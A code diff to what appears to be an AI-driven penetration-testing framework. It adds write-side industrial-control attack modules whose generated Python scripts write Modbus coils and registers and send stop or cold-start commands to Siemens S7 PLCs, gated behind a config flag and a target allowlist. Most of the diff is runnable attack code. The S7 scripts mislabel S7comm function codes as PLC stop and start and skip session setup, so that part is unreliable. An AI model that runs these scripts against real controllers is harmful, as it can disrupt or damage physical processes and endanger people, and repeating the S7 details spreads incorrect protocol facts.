@@ -1,10 +1,48 @@
-"""Attack modules: ICS/SCADA/IoT enumeration (READ-ONLY / non-disruptive)."""
+"""Attack modules: ICS/SCADA/IoT enumeration (READ-ONLY / non-disruptive).
+
+Phase 6.3 adds **write-side ICS modules** (``ModbusWriteCoil``,
+``ModbusWriteRegister``, ``S7PlcStop``, ``S7PlcStart``) for authorized PLC
+testing. Write-side ICS is **destructive risk** — a coil/register write or a
+PLC stop can change physical process state. The dual gate is:
+
+1. ``@require_allowlist()`` on ``run_attack_module`` (already enforced at the
+   MCP tool layer in ``tools/mcp_tools/attack_modules.py:1185``) — the target
+   IP must be in the operator's allowlist.
+2. ``ics.allow_write: true`` in ``config.yaml`` (default **false**) — an
+   explicit per-tool config flag the operator must set to authorize write-side
+   ICS. Read-only enum (the original modules above) works without it.
+
+A write-side module's ``run()`` checks ``_ics_write_allowed()`` and refuses
+(blocked) when the flag is false, so even if the allowlist lets the target
+through, the write never happens without the second gate. See the physical-
+damage warning in README §Configuration → ``ics.allow_write``.
+"""
 
 from __future__ import annotations
 
+import os
 from typing import Any
 
 from tools.attack_modules.base import AttackModule, ModuleContext
+
+
+def _ics_write_allowed() -> bool:
+    """Return True only when ``ics.allow_write: true`` is set in config.
+
+    Reads the config the same way the MCP layer does (``config.yaml`` at the
+    repo root or the path in ``AI_NMAP_CONFIG_PATH``). Default is False —
+    write-side ICS is opt-in and carries physical-damage risk. This is the
+    second gate of the dual lock; the first is ``@require_allowlist()`` on
+    ``run_attack_module`` (target must be in the allowlist).
+    """
+    config_path = os.environ.get("AI_NMAP_CONFIG_PATH") or "config.yaml"
+    try:
+        import yaml  # local import keeps the module importable without PyYAML
+        with open(config_path, "r", encoding="utf-8") as handle:
+            cfg = yaml.safe_load(handle) or {}
+    except Exception:
+        return False
+    return bool((cfg.get("ics", {}) or {}).get("allow_write", False))
 
 
 class ModbusEnum(AttackModule):
@@ -983,6 +1021,409 @@ def main() -> None:
         "default_cred_hits": creds,
         "note": "READ-ONLY cred CHECK against owned target; IoT default-cred list only.",
     }}
+    print(json.dumps(out, indent=2))
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+# ===========================================================================
+# Phase 6.3 — WRITE-SIDE ICS modules (destructive risk; dual-gated).
+#
+# These modules change physical process state (coil/register writes, PLC
+# stop/start). They are behind TWO gates:
+#   1. @require_allowlist() on run_attack_module (target must be in allowlist)
+#   2. ics.allow_write: true in config.yaml (default FALSE) — _ics_write_allowed()
+# A write-side module's run() refuses (blocked) unless BOTH gates pass.
+# Read-only enum above works without ics.allow_write.
+# ===========================================================================
+
+
+_WRITE_BLOCKED_NOTE = (
+    "BLOCKED: write-side ICS requires ics.allow_write: true in config.yaml "
+    "(default false — physical-damage risk). The target-IP allowlist gate is "
+    "enforced at the MCP tool layer; this is the second gate."
+)
+
+
+class ModbusWriteCoil(AttackModule):
+    """Write a single Modbus/TCP coil (FC 05) — DESTRUCTIVE.
+
+    Changes physical process state. Dual-gated: ``@require_allowlist()`` on
+    ``run_attack_module`` (target in allowlist) AND ``ics.allow_write: true``
+    in config. Refuses with a blocked status when the write flag is false.
+    """
+
+    name = "ModbusWriteCoil"
+    description = (
+        "Write a single Modbus/TCP coil (function code 05) to a target unit. "
+        "DESTRUCTIVE: changes physical process state. Requires ics.allow_write: true."
+    )
+    target_services = ["modbus", "tcp"]
+    target_ports = [502]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        if not _ics_write_allowed():
+            return {
+                "status": "blocked",
+                "module": self.name,
+                "target_ip": ctx.target_ip,
+                "note": _WRITE_BLOCKED_NOTE,
+            }
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": self.generate_python_script(ctx),
+            "note": (
+                "DESTRUCTIVE Modbus/TCP coil write (FC 05). Requires "
+                "ics.allow_write: true + target in allowlist. Connects only "
+                "to the single authorized target."
+            ),
+            "references": [
+                "modbus.org MODBUS Messaging on TCP/IP Implementation Guide v1.0b",
+                "MBFuncCode 05 Write Single Coil (destructive)",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f'''#!/usr/bin/env python3
+"""Modbus/TCP coil write (FC 05) -- DESTRUCTIVE / write-side.
+
+Requires ics.allow_write: true (enforced by the caller) + target in allowlist
+(enforced by @require_allowlist on run_attack_module). Connects only to the
+single authorized target. Write function code 05 (Write Single Coil) is used.
+"""
+import json
+import socket
+import struct
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+PORT = 502
+TIMEOUT = 3.0
+FC_WRITE_COIL = 5  # 0x05 -- Write Single Coil (destructive)
+tx_counter = 0
+
+
+def build_adu(unit_id: int, pdu: bytes) -> bytes:
+    global tx_counter
+    tx_counter += 1
+    length = len(pdu) + 1
+    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
+    return mbap + pdu
+
+
+def write_coil(unit_id: int, address: int, value: bool) -> bytes:
+    """PDU for FC 05 Write Single Coil. value=True -> 0xFF00, False -> 0x0000."""
+    return struct.pack(">BHH", FC_WRITE_COIL, address, 0xFF00 if value else 0x0000)
+
+
+def query(unit_id: int, pdu: bytes) -> bytes | None:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(TIMEOUT)
+            s.connect((TARGET, PORT))
+            s.send(build_adu(unit_id, pdu))
+            hdr = s.recv(7)
+            if len(hdr) < 7:
+                return None
+            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
+            rest = s.recv(length - 1) if length > 1 else b""
+            return hdr[6:7] + rest
+    except Exception:
+        return None
+
+
+def main() -> None:
+    # ponytail: single coil write at address 0, unit 1. The operator edits
+    # address/value/unit for their authorized PLC test.
+    resp = query(1, write_coil(1, 0, True))
+    print(json.dumps({{"target": TARGET, "port": PORT, "wrote": resp is not None}}))
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+class ModbusWriteRegister(AttackModule):
+    """Write a single Modbus/TCP holding register (FC 06) — DESTRUCTIVE.
+
+    Changes physical process state. Dual-gated like ``ModbusWriteCoil``.
+    """
+
+    name = "ModbusWriteRegister"
+    description = (
+        "Write a single Modbus/TCP holding register (function code 06) to a target "
+        "unit. DESTRUCTIVE: changes process state. Requires ics.allow_write: true."
+    )
+    target_services = ["modbus", "tcp"]
+    target_ports = [502]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        if not _ics_write_allowed():
+            return {
+                "status": "blocked",
+                "module": self.name,
+                "target_ip": ctx.target_ip,
+                "note": _WRITE_BLOCKED_NOTE,
+            }
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": self.generate_python_script(ctx),
+            "note": (
+                "DESTRUCTIVE Modbus/TCP holding-register write (FC 06). Requires "
+                "ics.allow_write: true + target in allowlist."
+            ),
+            "references": [
+                "MBFuncCode 06 Write Single Register (destructive)",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f'''#!/usr/bin/env python3
+"""Modbus/TCP holding-register write (FC 06) -- DESTRUCTIVE / write-side.
+
+Requires ics.allow_write: true + target in allowlist. Connects only to the
+single authorized target.
+"""
+import json
+import socket
+import struct
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+PORT = 502
+TIMEOUT = 3.0
+FC_WRITE_REGISTER = 6  # 0x06 -- Write Single Register (destructive)
+tx_counter = 0
+
+
+def build_adu(unit_id: int, pdu: bytes) -> bytes:
+    global tx_counter
+    tx_counter += 1
+    length = len(pdu) + 1
+    mbap = struct.pack(">HHHB", tx_counter, 0x0000, length, unit_id)
+    return mbap + pdu
+
+
+def write_register(unit_id: int, address: int, value: int) -> bytes:
+    return struct.pack(">BHH", FC_WRITE_REGISTER, address, value & 0xFFFF)
+
+
+def query(unit_id: int, pdu: bytes) -> bytes | None:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(TIMEOUT)
+            s.connect((TARGET, PORT))
+            s.send(build_adu(unit_id, pdu))
+            hdr = s.recv(7)
+            if len(hdr) < 7:
+                return None
+            _txn, _proto, length, _uid = struct.unpack(">HHHB", hdr)
+            rest = s.recv(length - 1) if length > 1 else b""
+            return hdr[6:7] + rest
+    except Exception:
+        return None
+
+
+def main() -> None:
+    resp = query(1, write_register(1, 0, 1))
+    print(json.dumps({{"target": TARGET, "port": PORT, "wrote": resp is not None}}))
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+class S7PlcStop(AttackModule):
+    """Stop a Siemens S7 PLC — DESTRUCTIVE (halts the controlled process).
+
+    Dual-gated: ``@require_allowlist()`` + ``ics.allow_write: true``.
+    """
+
+    name = "S7PlcStop"
+    description = (
+        "Stop a Siemens S7 PLC via S7comm PLC stop. DESTRUCTIVE: halts the "
+        "controlled physical process. Requires ics.allow_write: true."
+    )
+    target_services = ["iso-tsap", "s7", "s7comm"]
+    target_ports = [102]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        if not _ics_write_allowed():
+            return {
+                "status": "blocked",
+                "module": self.name,
+                "target_ip": ctx.target_ip,
+                "note": _WRITE_BLOCKED_NOTE,
+            }
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": self.generate_python_script(ctx),
+            "note": (
+                "DESTRUCTIVE S7 PLC stop. Halts the controlled process. Requires "
+                "ics.allow_write: true + target in allowlist."
+            ),
+            "references": [
+                "Siemens S7comm PLC stop (destructive control command)",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f'''#!/usr/bin/env python3
+"""Siemens S7 PLC stop -- DESTRUCTIVE / write-side.
+
+Requires ics.allow_write: true + target in allowlist. Sends an S7comm PLC
+stop command after the COTP/TPKT handshake. Connects only to the single
+authorized target.
+"""
+import json
+import socket
+import struct
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+PORT = 102
+TIMEOUT = 5.0
+
+
+def tpkt(payload: bytes) -> bytes:
+    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload
+
+
+def cotp_cr() -> bytes:
+    li = 0x11
+    code = 0xE0
+    var = bytes([0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x02, 0x00])
+    return bytes([li, code]) + struct.pack(">HH", 0x0001, 0x0001) + bytes([0x00]) + var
+
+
+def s7_plc_stop() -> bytes:
+    """S7comm PLC stop job (destructive)."""
+    cotp_dt = bytes([0x02, 0xF0, 0x80])
+    # S7 header: prot id 0x32 + ROSCTR 0x01 (job) + redid + pogid + datalen
+    # param: function 0x05 (PLC stop) — destructive control command
+    param = bytes([0x05, 0x01, 0x00, 0x00, 0x00, 0x00])
+    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
+    return cotp_dt + s7_hdr + param
+
+
+def main() -> None:
+    out = {{"target": TARGET, "port": PORT, "stopped": False}}
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(TIMEOUT)
+            s.connect((TARGET, PORT))
+            s.send(tpkt(cotp_cr()))
+            s.recv(4096)
+            s.send(tpkt(s7_plc_stop()))
+            out["stopped"] = True
+    except Exception as e:
+        out["error"] = str(e)
+    print(json.dumps(out, indent=2))
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+
+class S7PlcStart(AttackModule):
+    """Start a Siemens S7 PLC — write-side control command.
+
+    Dual-gated like the other write-side modules. Less destructive than stop
+    but still a control command that changes process state.
+    """
+
+    name = "S7PlcStart"
+    description = (
+        "Start a Siemens S7 PLC via S7comm PLC start/cold start. Write-side "
+        "control command. Requires ics.allow_write: true."
+    )
+    target_services = ["iso-tsap", "s7", "s7comm"]
+    target_ports = [102]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        if not _ics_write_allowed():
+            return {
+                "status": "blocked",
+                "module": self.name,
+                "target_ip": ctx.target_ip,
+                "note": _WRITE_BLOCKED_NOTE,
+            }
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": self.generate_python_script(ctx),
+            "note": (
+                "Write-side S7 PLC start (cold start). Changes process state. "
+                "Requires ics.allow_write: true + target in allowlist."
+            ),
+            "references": [
+                "Siemens S7comm PLC start / cold start (control command)",
+            ],
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f'''#!/usr/bin/env python3
+"""Siemens S7 PLC start -- write-side control command.
+
+Requires ics.allow_write: true + target in allowlist. Sends an S7comm PLC
+cold-start command after the COTP/TPKT handshake. Connects only to the
+single authorized target.
+"""
+import json
+import socket
+import struct
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
+PORT = 102
+TIMEOUT = 5.0
+
+
+def tpkt(payload: bytes) -> bytes:
+    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload
+
+
+def cotp_cr() -> bytes:
+    li = 0x11
+    code = 0xE0
+    var = bytes([0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x01, 0x00, 0xC2, 0x02, 0x02, 0x00])
+    return bytes([li, code]) + struct.pack(">HH", 0x0001, 0x0001) + bytes([0x00]) + var
+
+
+def s7_plc_start() -> bytes:
+    """S7comm PLC cold-start job (write-side control command)."""
+    cotp_dt = bytes([0x02, 0xF0, 0x80])
+    # function 0x06 = PLC start / cold start
+    param = bytes([0x06, 0x01, 0x00, 0x00, 0x00, 0x00])
+    s7_hdr = struct.pack(">BBHHH", 0x32, 0x01, 0x0000, 0x0000, len(param))
+    return cotp_dt + s7_hdr + param
+
+
+def main() -> None:
+    out = {{"target": TARGET, "port": PORT, "started": False}}
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(TIMEOUT)
+            s.connect((TARGET, PORT))
+            s.send(tpkt(cotp_cr()))
+            s.recv(4096)
+            s.send(tpkt(s7_plc_start()))
+            out["started"] = True
+    except Exception as e:
+        out["error"] = str(e)
     print(json.dumps(out, indent=2))
 
 
